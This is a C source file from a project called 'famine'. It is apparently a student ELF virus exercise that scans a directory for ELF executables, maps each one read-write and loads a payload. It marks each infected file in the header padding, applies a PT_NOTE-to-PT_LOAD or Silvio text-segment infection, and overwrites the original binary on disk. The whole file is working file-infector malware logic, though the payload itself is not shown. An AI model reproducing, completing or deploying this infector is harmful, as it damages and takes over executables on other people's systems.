/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   utils_infection.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/08/18 14:10:16 by mabouce           #+#    #+#             */
/*   Updated: 2021/08/18 14:10:16 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void overwrite_original_binary(t_famine *famine)
{
    // Add space in the original binary file and overwrite it with the infected file.
    if (lseek(famine->input_file_fd, 0, SEEK_END) != -1)
    {
        char zero_fill[PAGE_SIZE];
        bzero(zero_fill, PAGE_SIZE);
        write(famine->input_file_fd, zero_fill, PAGE_SIZE);
        // Write in the original file.
        memcpy(famine->mmap_ptr, famine->infected_file, famine->infected_file_size);
    }
    else
    {
        close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine);
    }
}

void apply_infection(t_famine *famine)
{
    set_string_table_ptr(famine);
    load_payload(famine, PAYLOAD_NAME_64);

    // Set a flag in the EI_PAD header padding that indicate the file have been infected.
    famine->ehdr->e_ident[EI_PAD + 3] = 7;

    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
    {
        if (famine->phdr[i].p_type == PT_LOAD && famine->phdr[i].p_flags == (PF_R | PF_X))
        {
            //text found here, get the offset of the end of the section;
            famine->text_p_start_offset = famine->phdr[i].p_offset;
            famine->text_p_end_offset = famine->phdr[i].p_offset + famine->phdr[i].p_filesz;
            famine->text_p_size = famine->phdr[i].p_filesz;
            famine->text_p_vaddr = famine->phdr[i].p_vaddr;

            // TODO remove line bellow
            pt_note_to_pt_load_infection(famine);
            overwrite_original_binary(famine);
            break;
            // END TODO

            // Check if there is enought space for our payload in the text section.
            if (famine->payload_size > PAGE_SIZE)
            {
                error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
            }
            else if (famine->text_p_end_offset % PAGE_SIZE + famine->payload_size < PAGE_SIZE)
            {
                if (DEBUG == true)
                    printf("Applying silvio_text infection.\n");
                silvio_text_infection(famine);
                overwrite_original_binary(famine);
            }
            else
            {
                error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
            }
            break;
        }
    }
}

int get_binary_data(char *file_name, t_famine *famine)
{
    double binary_data_size;
    struct stat FileAttrib;

    // Checking file is a regular file.
    if (stat(file_name, &FileAttrib) < 0)
    {
        return error(ERROR_STAT, famine);
    }
    else if ((FileAttrib.st_mode & S_IFMT) != S_IFREG)
    {
        return error(ERROR_NOT_A_REGULAR_FILE, famine);
    }

    if ((famine->input_file_fd = open(file_name, O_RDWR)) == -1)
    {
        return error(ERROR_OPEN, famine);
    }

    if ((binary_data_size = lseek(famine->input_file_fd, 0, SEEK_END)) != -1)
    {
        famine->binary_data_size = (size_t)binary_data_size;

        // Go back to the start of the file.
        if (lseek(famine->input_file_fd, 0, SEEK_SET) != 0)
        {
            return (close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine));
        }
        // Copy binary address map
        if (!(famine->mmap_ptr = mmap(0, famine->binary_data_size + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, famine->input_file_fd, 0)))
        {
            return (close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_MMAP, famine));
        }
        return 0;
    }
    else
    {
        return (close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine));
    }
}

int infect_file_in_folder(const char *path)
{
    struct dirent *dp;
    DIR *dir;
    t_famine *famine;
    char *input_file_name;

    if (!(dir = opendir(path)))
    {
        // Unable to open directory stream
        if (DEBUG == true)
            printf("Unable to open the directory in the following path : %s\n", path);
        return ERROR_OPENDIR;
    }

    while ((dp = readdir(dir)) != NULL)
    {
        if (!(famine = (t_famine *)malloc(sizeof(t_famine))))
        {
            free(dir);
            return error(ERROR_MALLOC_FAMINE_STRUCT, famine);
        }
        set_famine_ptrs_to_null(famine);

        if (!(input_file_name = concat_strings(path, dp->d_name)))
        {
            free(dir);
            return error(ERROR_CONCAT_STRINGS, famine);
        }
        if (DEBUG == true)
            printf("input_file_name = %s\n", input_file_name);
        if (get_binary_data(input_file_name, famine) || check_elf_header(famine))
        {
            if (DEBUG == true)
                printf("Wrong file type, continuing.\n");
            free(input_file_name);
            continue;
        }
        free(input_file_name);

        famine->ehdr = (t_elf_ehdr *)famine->mmap_ptr;
        famine->old_entry_point = famine->ehdr->e_entry;
        famine->phdr = (t_elf_phdr *)((famine->mmap_ptr + famine->ehdr->e_phoff));
        famine->shdr = (t_elf_shdr *)((famine->mmap_ptr + famine->ehdr->e_shoff));
        apply_infection(famine);

        if (close(famine->input_file_fd) == -1)
        {
            free_famine(famine);
            return ERROR_CLOSE;
        }
        free_famine(famine);
    }

    if (closedir(dir) == -1)
    {
        return ERROR_CLOSEDIR;
    }
    return 0;
}